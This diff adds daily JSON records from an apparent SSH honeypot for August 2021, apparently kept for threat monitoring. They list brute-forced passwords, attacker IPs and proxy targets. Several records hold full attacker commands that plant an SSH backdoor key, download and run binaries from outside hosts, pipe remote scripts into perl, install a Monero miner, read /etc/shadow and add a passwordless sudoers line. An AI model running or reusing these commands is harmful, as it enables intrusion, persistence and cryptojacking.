@@ -1481,6 +1481,339 @@
   ]
 },
 {
+  "date": "2021-08-03",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 1810
+    },
+    {
+      "username": "nproc",
+      "password": "nproc",
+      "count": 364
+    },
+    {
+      "username": "minerstat",
+      "password": "msos",
+      "count": 28
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 15
+    },
+    {
+      "username": "minerstat",
+      "password": "smos",
+      "count": 9
+    }
+  ],
+  "commands": [
+    {
+      "input": "uname -a",
+      "count": 376
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "count": 374
+    },
+    {
+      "input": "uname -m",
+      "count": 373
+    },
+    {
+      "input": "w",
+      "count": 373
+    },
+    {
+      "input": "crontab -l",
+      "count": 373
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 372
+    },
+    {
+      "input": "cat /etc/issue",
+      "count": 24
+    },
+    {
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "count": 12
+    },
+    {
+      "input": "uname -a;id;cat /etc/shadow /etc/passwd;lscpu;chattr -ia /root/.ssh/*;wget http://highpower.sg/..... -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget -qO - http://highpower.sg/...|perl;wget http://highpower.sg/.... -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
+      "count": 6
+    },
+    {
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Root12345",
+      "count": 2
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 641
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 588
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 169
+    },
+    {
+      "src_ip": "49.233.175.111",
+      "dst_port": 2222,
+      "count": 164
+    },
+    {
+      "src_ip": "5.188.62.219",
+      "dst_port": 2222,
+      "count": 157
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 588
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 445
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": true,
+      "count": 197
+    },
+    {
+      "src_ip": "49.233.175.111",
+      "robot": true,
+      "count": 164
+    },
+    {
+      "src_ip": "5.188.62.219",
+      "robot": false,
+      "count": 149
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "209.71.212.18",
+      "dst_port": 443,
+      "count": 2674
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "check2.zennolab.com",
+      "dst_port": 80,
+      "count": 1028
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 653
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 588
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "check2.zennolab.com",
+      "dst_port": 80,
+      "count": 509
+    }
+  ]
+},
+{
+  "date": "2021-08-17",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 2208
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 11
+    },
+    {
+      "username": "root",
+      "password": "root",
+      "count": 8
+    },
+    {
+      "username": "pi",
+      "password": "raspberry",
+      "count": 7
+    },
+    {
+      "username": "pi",
+      "password": "raspberryraspberry993311",
+      "count": 6
+    }
+  ],
+  "commands": [
+    {
+      "input": "cd /tmp; rm -rf x86_64; wget http://185.150.117.103/x86_64; curl -O http://185.150.117.103/x86_64; chmod 777 *; ./x86_64 x86_64; pkill xmirg; pkill Xorg; pkill Opera; pkill x86",
+      "count": 28
+    },
+    {
+      "input": "nproc;wget -qO - 93.113.207.213/perlscan|perl",
+      "count": 13
+    },
+    {
+      "input": "uname -a",
+      "count": 6
+    },
+    {
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "count": 4
+    },
+    {
+      "input": "curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 47v9mKikPcCZCq5mDn71ssWLDQ9UkrbiE2Tgu37BueHCHULTp5F6eHG1PA7X6o5RrW3tLjKVaCKrt23ATHn25hyy81iXQVL; curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/uninstall_c3pool_miner.sh | bash -s",
+      "count": 4
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "cd /tmp; rm -rf x86_64; wget http://185.150.117.103/x86_64; curl -O http://185.150.117.103/x86_64; chmod 777 *; ./x86_64 x86_64; pkill xmirg; pkill Xorg; pkill Opera; pkill x86",
+      "count": 28
+    },
+    {
+      "input": "nproc;wget -qO - 93.113.207.213/perlscan|perl",
+      "count": 13
+    },
+    {
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "count": 4
+    },
+    {
+      "input": "echo Hi | cat -n",
+      "count": 2
+    },
+    {
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
+      "count": 2
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 758
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 597
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 582
+    },
+    {
+      "src_ip": "49.233.175.111",
+      "dst_port": 2222,
+      "count": 158
+    },
+    {
+      "src_ip": "5.188.62.232",
+      "dst_port": 2222,
+      "count": 88
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 582
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": false,
+      "count": 417
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": true,
+      "count": 341
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 308
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": true,
+      "count": 288
+    }
+  ],
+  "file_download": [
+    {
+      "url": "http://93.113.207.213/perlscan",
+      "outfile": "var/lib/cowrie/downloads/60c59dc2dd7bb5bf7aa505fc279d245c618eeaa92285ed23f4c739b7905e1d4a",
+      "scans": {
+        "positives": 34,
+        "total": 59
+      },
+      "count": 1
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 1542
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "check2.zennolab.com",
+      "dst_port": 80,
+      "count": 849
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chek.zennolab.com",
+      "dst_port": 80,
+      "count": 631
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 582
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 341
+    }
+  ]
+},
+{
   "date": "2021-07-19",
   "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
   "passwords": [
@@ -2303,6 +2636,163 @@
   ]
 },
 {
+  "date": "2021-08-16",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 1970
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 17
+    },
+    {
+      "username": "minerstat",
+      "password": "msos",
+      "count": 9
+    },
+    {
+      "username": "user",
+      "password": "1234",
+      "count": 4
+    },
+    {
+      "username": "pi",
+      "password": "raspberry",
+      "count": 4
+    }
+  ],
+  "commands": [
+    {
+      "input": "uname -a",
+      "count": 3
+    },
+    {
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
+      "count": 2
+    },
+    {
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "count": 2
+    },
+    {
+      "input": "curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 47v9mKikPcCZCq5mDn71ssWLDQ9UkrbiE2Tgu37BueHCHULTp5F6eHG1PA7X6o5RrW3tLjKVaCKrt23ATHn25hyy81iXQVL; curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/uninstall_c3pool_miner.sh | bash -s",
+      "count": 2
+    },
+    {
+      "input": "cat /proc/cpuinfo",
+      "count": 1
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
+      "count": 2
+    },
+    {
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "count": 2
+    },
+    {
+      "input": "cat /proc/cpuinfo",
+      "count": 1
+    },
+    {
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Root12345",
+      "count": 1
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 632
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 627
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 493
+    },
+    {
+      "src_ip": "49.233.175.111",
+      "dst_port": 2222,
+      "count": 160
+    },
+    {
+      "src_ip": "5.188.62.219",
+      "dst_port": 2222,
+      "count": 69
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 632
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": false,
+      "count": 419
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 297
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": true,
+      "count": 208
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": true,
+      "count": 197
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 1535
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "check2.zennolab.com",
+      "dst_port": 80,
+      "count": 905
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chek.zennolab.com",
+      "dst_port": 80,
+      "count": 843
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 632
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "69.195.128.18",
+      "dst_port": 80,
+      "count": 278
+    }
+  ]
+},
+{
   "date": "2021-03-15",
   "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01",
   "passwords": [
@@ -3063,6 +3553,167 @@
   ]
 },
 {
+  "date": "2021-08-07",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 2378
+    },
+    {
+      "username": "nproc",
+      "password": "nproc",
+      "count": 280
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 18
+    },
+    {
+      "username": "minerstat",
+      "password": "msos",
+      "count": 16
+    },
+    {
+      "username": "ansible",
+      "password": "ansible",
+      "count": 8
+    }
+  ],
+  "commands": [
+    {
+      "input": "uname -a",
+      "count": 286
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+      "count": 284
+    },
+    {
+      "input": "uname -m",
+      "count": 284
+    },
+    {
+      "input": "w",
+      "count": 284
+    },
+    {
+      "input": "crontab -l",
+      "count": 284
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 283
+    },
+    {
+      "input": "cat /etc/issue; cd /tmp; wget http://45.133.9.32/x86_64; chmod 777 *; ./x86_64 x86xhed; rm -rf *",
+      "count": 15
+    },
+    {
+      "input": "pkill Opera; pkill Xorg; pkill x86_64; cd /tmp; curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 47v9mKikPcCZCq5mDn71ssWLDQ9UkrbiE2Tgu37BueHCHULTp5F6eHG1PA7X6o5RrW3tLjKVaCKrt23ATHn25hyy81iXQVL; pkill Xorg; pkill x86_64;",
+      "count": 13
+    },
+    {
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
+      "count": 2
+    },
+    {
+      "input": "touch /tmp/steak/analfisting",
+      "count": 1
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 642
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 558
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 493
+    },
+    {
+      "src_ip": "5.188.62.229",
+      "dst_port": 2222,
+      "count": 277
+    },
+    {
+      "src_ip": "49.233.175.111",
+      "dst_port": 2222,
+      "count": 161
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 642
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 346
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": false,
+      "count": 285
+    },
+    {
+      "src_ip": "5.188.62.229",
+      "robot": false,
+      "count": 268
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": true,
+      "count": 213
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 642
+    },
+    {
+      "src_ip": "5.188.62.229",
+      "dst_ip": "auth.mail.ru",
+      "dst_port": 443,
+      "count": 477
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "69.195.128.18",
+      "dst_port": 80,
+      "count": 342
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chek.zennolab.com",
+      "dst_port": 80,
+      "count": 285
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "209.71.212.18",
+      "dst_port": 443,
+      "count": 282
+    }
+  ]
+},
+{
   "date": "2021-07-18",
   "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
   "passwords": [
@@ -3261,6 +3912,139 @@
       "dst_ip": "69.195.128.18",
       "dst_port": 80,
       "count": 413
+    }
+  ]
+},
+{
+  "date": "2021-08-12",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 2856
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 11
+    },
+    {
+      "username": "minerstat",
+      "password": "msos",
+      "count": 6
+    },
+    {
+      "username": "RPM",
+      "password": "RPM",
+      "count": 2
+    },
+    {
+      "username": "admin",
+      "password": "123456",
+      "count": 2
+    }
+  ],
+  "commands": [
+    {
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Root12345",
+      "count": 1
+    },
+    {
+      "input": "uname -a",
+      "count": 1
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Root12345",
+      "count": 1
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 763
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 753
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 671
+    },
+    {
+      "src_ip": "5.188.62.223",
+      "dst_port": 2222,
+      "count": 224
+    },
+    {
+      "src_ip": "5.188.62.219",
+      "dst_port": 2222,
+      "count": 167
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 753
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": false,
+      "count": 434
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 379
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": true,
+      "count": 329
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": true,
+      "count": 292
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "check2.zennolab.com",
+      "dst_port": 80,
+      "count": 1932
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 1350
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chek.zennolab.com",
+      "dst_port": 80,
+      "count": 1322
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 753
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "209.71.212.18",
+      "dst_port": 443,
+      "count": 692
     }
   ]
 },
@@ -4676,6 +5460,167 @@
   ]
 },
 {
+  "date": "2021-08-08",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 2295
+    },
+    {
+      "username": "nproc",
+      "password": "nproc",
+      "count": 230
+    },
+    {
+      "username": "minerstat",
+      "password": "msos",
+      "count": 12
+    },
+    {
+      "username": "root",
+      "password": "1qazXSW@",
+      "count": 4
+    },
+    {
+      "username": "root",
+      "password": "",
+      "count": 4
+    }
+  ],
+  "commands": [
+    {
+      "input": "uname -a",
+      "count": 236
+    },
+    {
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 234
+    },
+    {
+      "input": "lscpu | grep Model",
+      "count": 234
+    },
+    {
+      "input": "uname",
+      "count": 234
+    },
+    {
+      "input": "top",
+      "count": 234
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 234
+    },
+    {
+      "input": "uname -s -v -n -r -m",
+      "count": 163
+    },
+    {
+      "input": "uname -a;uptime",
+      "count": 39
+    },
+    {
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "count": 13
+    },
+    {
+      "input": "uname -a;id;cat /etc/shadow /etc/passwd;lscpu;chattr -ia /root/.ssh/*;wget http://highpower.sg/..... -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget -qO - http://highpower.sg/...|perl;wget http://highpower.sg/.... -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
+      "count": 3
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 611
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 562
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 530
+    },
+    {
+      "src_ip": "5.188.62.223",
+      "dst_port": 2222,
+      "count": 195
+    },
+    {
+      "src_ip": "77.247.127.130",
+      "dst_port": 2222,
+      "count": 170
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 562
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 387
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": false,
+      "count": 314
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": true,
+      "count": 223
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": true,
+      "count": 216
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "5.182.39.74",
+      "dst_ip": "209.71.212.18",
+      "dst_port": 443,
+      "count": 745
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_ip": "ya.ru",
+      "dst_port": 80,
+      "count": 562
+    },
+    {
+      "src_ip": "5.188.62.223",
+      "dst_ip": "www.youtube.com",
+      "dst_port": 443,
+      "count": 470
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 465
+    },
+    {
+      "src_ip": "5.188.62.223",
+      "dst_ip": "s.youtube.com",
+      "dst_port": 443,
+      "count": 402
+    }
+  ]
+},
+{
   "date": "2021-07-24",
   "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
   "passwords": [
@@ -4833,6 +5778,185 @@
       "dst_ip": "s.youtube.com",
       "dst_port": 443,
       "count": 258
+    }
+  ]
+},
+{
+  "date": "2021-08-05",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 2624
+    },
+    {
+      "username": "nproc",
+      "password": "nproc",
+      "count": 435
+    },
+    {
+      "username": "minerstat",
+      "password": "msos",
+      "count": 18
+    },
+    {
+      "username": "user",
+      "password": "1",
+      "count": 16
+    },
+    {
+      "username": "root",
+      "password": "zhang123",
+      "count": 6
+    }
+  ],
+  "commands": [
+    {
+      "input": "uname -a",
+      "count": 449
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "count": 449
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+      "count": 448
+    },
+    {
+      "input": "top",
+      "count": 447
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+      "count": 447
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 444
+    },
+    {
+      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
+      "count": 2
+    },
+    {
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Root12345",
+      "count": 2
+    },
+    {
+      "input": "top",
+      "count": 1
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+      "count": 1
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "5.182.39.75",
+      "dst_port": 2222,
+      "count": 718
+    },
+    {
+      "src_ip": "45.227.255.205",
+      "dst_port": 2222,
+      "count": 639
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "dst_port": 2222,
+      "count": 608
+    },
+    {
+      "src_ip": "5.188.62.219",
+      "dst_port": 2222,
+      "count": 190
+    },
+    {
+      "src_ip": "49.233.175.111",
+      "dst_port": 2222,
+      "count": 164
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "45.227.255.205",
+      "robot": true,
+      "count": 639
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": false,
+      "count": 433
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": false,
+      "count": 407
+    },
+    {
+      "src_ip": "5.182.39.75",
+      "robot": true,
+      "count": 285
+    },
+    {
+      "src_ip": "5.182.39.74",
+      "robot": true,
+      "count": 202
+    }
+  ],
+  "file_download": [
+    {
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/55bf8aa53431060cb5896404eb621a04e12b0fc441eca7ab511cd408ebaff563",
+      "scans": {
